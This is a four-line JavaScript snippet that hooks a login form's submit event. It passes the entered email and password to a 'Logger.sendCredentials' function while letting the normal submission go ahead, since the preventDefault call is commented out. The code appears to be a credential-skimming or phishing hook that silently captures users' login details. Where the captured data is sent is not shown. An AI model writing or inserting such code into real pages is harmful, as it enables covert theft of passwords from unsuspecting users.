document.getElementById('loginForm').addEventListener('submit', event => {
    //event.preventDefault();
    Logger.sendCredentials(document.getElementById('email').value, document.getElementById('password').value);
});